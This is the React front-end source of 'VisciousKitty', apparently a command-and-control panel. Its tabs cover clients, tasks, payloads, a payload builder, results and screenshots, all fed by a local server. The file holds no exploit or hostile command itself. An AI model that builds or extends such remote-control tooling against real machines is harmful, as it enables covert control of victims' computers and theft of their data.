import './App.css';
import React, { useEffect, useState, useCallback, useRef } from 'react'
import { createPortal } from 'react-dom'

import Header from './components/Header'
import SmallCard from './components/SmallCard'
import VkCheckbox from './components/VkCheckbox'
import VkSelect from './components/VkSelect'
import AnimatedCountdown from './components/AnimatedCountdown'
import SendPayloadInline from './components/SendPayloadInline'
import BuildLogModal from './components/BuildLogModal'
import Machine from './pages/Machine'
import Dashboard from './pages/Dashboard'
import Clients from './pages/Clients'
import Tasks from './pages/Tasks'
import Payloads from './pages/Payloads'
import Builder from './pages/Builder'
import Results from './pages/Results'
import Customize from './pages/Customize'
import Settings from './pages/Settings'

import { usePolling, formatAgo, genId, watchForResult, watchForScreenshot } from './lib/utils'

// Nickname helpers persisted in localStorage
function loadNicknames(){ try{ return JSON.parse(localStorage.getItem('vk_nicknames')||'{}') }catch{return {}} }
function saveNicknames(map){ try{ localStorage.setItem('vk_nicknames', JSON.stringify(map||{})) }catch{} }

const SERVER = 'http://127.0.0.1:8000'

function App({ initialTab = 'dashboard' }){
  const [tab, setTab] = useState(initialTab)
  const [selectedMachine, setSelectedMachine] = useState(null)
  const [clients, setClients] = useState([])
  const [tasksCount, setTasksCount] = useState(0)
  const [clientsCount, setClientsCount] = useState(0)
  const [payloads, setPayloads] = useState([])
  const [pollMs, setPollMs] = useState(() => {
    try{ const v = localStorage.getItem('vk_poll_ms'); return v ? parseInt(v,10) : 10000 }catch{ return 10000 }
  })
  const [reduceMotion, setReduceMotion] = useState(() => {
    try{ return localStorage.getItem('vk_reduce_motion') === '1' }catch{ return false }
  })
  // simple ticking state to trigger per-second re-renders for countdowns
  const [now, setNow] = useState(() => Date.now()/1000)
  const [nicknames, setNicknames] = useState(() => loadNicknames())

  const setNickname = (machineId, name) => {
    setNicknames(prev => {
      const next = {...(prev||{})}
      if(name) next[machineId] = name
      else delete next[machineId]
      saveNicknames(next)
      return next
    })
  }

  // FIXED — stable callback (this prevents infinite polling spawns)
  const fetchCounts = useCallback(async () => {
    try{
      const cs = await (await fetch(SERVER + '/clients_status')).json()
      const mapping = cs.clients_status || {}
      setClients(Object.entries(mapping).map(([id, info]) => ({id, ...info})))
      setClientsCount(Object.keys(mapping).length)

      try{
        const rt = await fetch(SERVER + '/tasks_count')
        const dt = await rt.json()
        setTasksCount(dt.count || 0)
      }catch(e){ setTasksCount(0) }
    }catch(e){ /* ignore */ }
  }, [])

  // FIXED — stable callback
  const loadPayloads = useCallback(async () => {
    try{
      const r = await fetch(SERVER + '/payloads')
      const d = await r.json()
      setPayloads(d.payloads || [])
    }catch(e){ /* ignore */ }
  }, [])

  // Polling uses a configurable interval
  usePolling(fetchCounts, pollMs)

  useEffect(() => { fetchCounts(); loadPayloads() }, [fetchCounts, loadPayloads])
  useEffect(() => { try{ localStorage.setItem('vk_poll_ms', String(pollMs)) }catch(e){} }, [pollMs])
  useEffect(() => { if (reduceMotion) document.documentElement.classList.add('reduced-motion'); else document.documentElement.classList.remove('reduced-motion'); try{ localStorage.setItem('vk_reduce_motion', reduceMotion ? '1':'0') }catch(e){} }, [reduceMotion])

  // tick every second to update countdown displays
  useEffect(() => {
    const iv = setInterval(() => setNow(Date.now()/1000), 1000)
    return () => clearInterval(iv)
  }, [])

  return (
    <div className="App">
      <div className="stars" />
      <div className="nebula" />
      <div className='container'>
        <aside className='sidebar'>
          <div className='logo'>
            <div className='badge'>VK</div>
            <div>
              <h1>VisciousKitty</h1>
              <div className='muted'>fleet control</div>
            </div>
          </div>

          <div style={{height:8}} />
          <div style={{display:'flex', gap:8, marginBottom:12}}>
            <div className='statusPill'>Dark mode</div>
            <div className='statusPill' style={{color:'#fff', background:'transparent', border:'1px solid rgba(255,255,255,0.03)'}}>v0.1</div>
          </div>

          <div className='nav'>
            <button className={tab==='dashboard'? 'active':''} onClick={()=>setTab('dashboard')}>Dashboard</button>
            <button className={tab==='clients'? 'active':''} onClick={()=>setTab('clients')}>Clients</button>
            <button className={tab==='tasks'? 'active':''} onClick={()=>setTab('tasks')}>Tasks</button>
            <button className={tab==='payloads'? 'active':''} onClick={()=>setTab('payloads')}>Payloads</button>
            <button className={tab==='builder'? 'active':''} onClick={()=>setTab('builder')}>Builder</button>
            <button className={tab==='results'? 'active':''} onClick={()=>setTab('results')}>Results</button>
            <div style={{height:6}}></div>
            <button className={tab==='customize'? 'active':''} onClick={()=>setTab('customize')}>Customize</button>
            <button className={tab==='settings'? 'active':''} onClick={()=>setTab('settings')}>Settings</button>
          </div>
        </aside>

        <main className='main'>
          <Header clients={clientsCount} tasks={tasksCount} />

          {tab === 'dashboard' && (
            <div className="panel"><Dashboard clientsCount={clientsCount} tasksCount={tasksCount} payloads={payloads} clients={clients} now={now} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} /></div>
          )}

          {/* Clients panel (rendered below with nickname support) */}
          {tab === 'tasks' && <div className="panel"><Tasks server={SERVER} /></div>}
          {tab === 'payloads' && <div className="panel"><Payloads server={SERVER} payloads={payloads} setPayloads={setPayloads} /></div>}
          {tab === 'builder' && <div className="panel"><Builder server={SERVER} /></div>}
          {tab === 'clients' && <div className="panel"><Clients server={SERVER} payloads={payloads} onOpenMachine={(id)=>{ setSelectedMachine(id); setTab('machine') }} now={now} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'results' && <div className="panel"><Results server={SERVER} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'machine' && selectedMachine && <div className="panel"><Machine server={SERVER} machineId={selectedMachine} payloads={payloads} nicknames={nicknames} setNickname={setNickname} /></div>}
          {tab === 'customize' && <div className="panel"><Customize /></div>}
          {tab === 'settings' && <div className="panel"><Settings server={SERVER} /></div>}

          <div className='footer'>Made with ❤️ in the void — VisciousKitty</div>
        </main>
      </div>
    </div>
  )
}

/* pages extracted to ./pages */
export default App;
